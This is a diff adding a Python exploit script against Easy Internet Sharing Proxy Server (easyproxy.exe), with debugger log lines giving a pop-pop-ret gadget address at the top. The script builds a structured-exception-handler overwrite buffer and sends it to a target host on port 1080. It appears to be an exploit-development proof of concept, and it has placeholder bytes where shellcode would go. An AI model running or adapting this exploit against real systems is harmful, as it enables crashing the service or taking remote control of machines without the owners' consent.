@@ -1,0 +1,27 @@
+# Log data, item 12
+# Address=004794B3
+# Message=  0x004794b3 : pop ecx # pop ecx # ret 0x08 | startnull {PAGE_EXECUTE_READ} [easyproxy.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.2.0.0 (C:\EFS Software\Easy Internet Sharing Proxy Server\easyproxy.exe)
+
+import socket, sys, struct
+
+crash = "\x88" * 1000
+crash += "A" * 30
+crash += "B" * 4 # nseh
+crash += struct.pack('<L', 0x004794b3)
+crash += "D" * (1000 - 30 - 8)
+
+try:
+    host = sys.argv[1]
+except:
+    print('[!] Usage: {} [target]'.format(sys.argv[0]))
+    sys.exit()
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, 1080))
+except:
+    print('[!] Could not connect!')
+    sys.exit()
+
+s.send(crash)
+s.close()
